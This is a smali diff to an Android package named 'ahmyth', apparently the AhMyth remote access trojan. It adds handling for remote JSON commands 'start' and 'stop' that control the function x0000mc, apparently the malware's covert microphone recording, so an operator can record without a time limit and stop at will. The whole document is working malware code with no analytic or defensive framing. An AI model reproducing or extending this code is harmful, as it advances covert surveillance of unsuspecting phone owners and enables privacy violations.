@@ -219,6 +219,49 @@
     goto/16 :goto_2
 
     :pswitch_1
+    :try_start_3
+    const-string v0, "extra"
+
+    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_6
+
+    const-string v0, "extra"
+
+    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    const-string v1, "start"
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_7
+
+    const/4 p1, -0x1
+
+    invoke-static {p1}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000mc(I)V
+
+    goto/16 :goto_2
+
+    :cond_7
+    const-string v1, "stop"
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_6
+
+    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000mcStop()V
+
+    goto/16 :goto_2
+
+    :cond_6
     const-string v0, "sec"
 
     invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I
@@ -226,6 +269,8 @@
     move-result p1
 
     invoke-static {p1}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000mc(I)V
+    :try_end_3
+    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
 
     goto/16 :goto_2
 
